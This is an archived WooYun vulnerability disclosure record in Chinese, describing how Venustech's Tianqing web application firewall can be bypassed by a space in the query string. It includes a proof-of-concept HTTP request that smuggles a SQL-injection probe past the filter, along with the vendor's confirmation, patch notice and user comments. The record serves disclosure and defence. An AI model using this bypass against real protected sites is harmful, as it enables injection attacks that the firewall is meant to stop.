{"id": 579, "wybug_id": "wooyun-2014-069191", "wybug_title": "启明星辰天清Web应用安全网关协议解析绕过漏洞", "wybug_corp": "北京启明星辰信息安全技术有限公司", "wybug_author": "Safe3", "wybug_date": "2014-07-21 15:52", "wybug_open_date": "2014-10-19 15:54", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["硬件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向公众公开  简要描述： 启明星辰天清Web应用安全网关中存在协议解析绕过漏洞，该漏洞源于对http协议兼容未正确处理。攻击者可利用该漏洞绕过WAF对于querystring的所有过滤，从而攻击受保护的网站。 详细说明：  Servlet/2.5等jsp处理容器，能够正确处理http协议GET /news.jsp?x= &id=16 HTTP/1.1中参数&id=16前面的空格获取id=16这个参数，例如下数据包返回网页正常：GET /news.jsp?x= &id=16 HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Connection: closeHost: www.test.comPragma: no-cache与http://www.test.com/news.jsp?id=16返回网页相同。而启明星辰天清Web应用安全网关解析协议时，会忽略GET /news.jsp?x= &id=16%20and%201=1 HTTP/1.1中\"?x=空格\"之后的参数，从而绕过防护。例直接访问：http://www.test.com/news.jsp?x=%20&id=16%20and%201=1会拦截构造如下poc绕过：GET /news.jsp?x= &id=16%20and%201=1 HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Connection: closeHost: www.test.comPragma: no-cache   漏洞证明：  见详细说明   修复方案：  正确解析http请求第一行中 url参数带空格字符后的参数   版权声明：转载请注明来源 Safe3@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-07-21 20:48 厂商回复： 谢谢，我们在修复 最新状态： 2014-07-22：我们已经推出升级。  ", "replys": "漏洞评价：\n评论\n     2014-07-21 16:04 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  大牛啊    \n     2014-07-21 16:04 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  这是要火呀    \n     2014-07-21 16:16 |    \t\txiaokinghk \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:16        | 【DBA】)\t\t \n  http://www.273tech.com/原来是 \tSafe3 的大牛 ，原来是来踢馆的    \n     2014-07-21 17:24 |    \t\t广州简悦(乌云厂商)\t\t \n  这馆踢得略给力啊~~~    \n     2014-07-21 19:27 |    \t\t小威 \t\t\t( 普通白帽子  |\t\t\t        Rank:492 漏洞数:76        | 活到老，学到老!)\t\t \n  @广州简悦 厂商，你莫要调皮    \n     2014-07-22 16:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我去，给力啊    \n     2014-07-25 14:38 |    \t\tc32 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一名天天向上的小菜鸟.)\t\t \n  求细节    \n     2014-08-21 09:12 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个给力，这也可以。看来这产品做的……    \n     2014-10-21 17:00 |    \t\tI am XiaoM \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:4        | 看着大家的Rank我深深被伤了...)\t\t \n  瓜子花生可乐    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}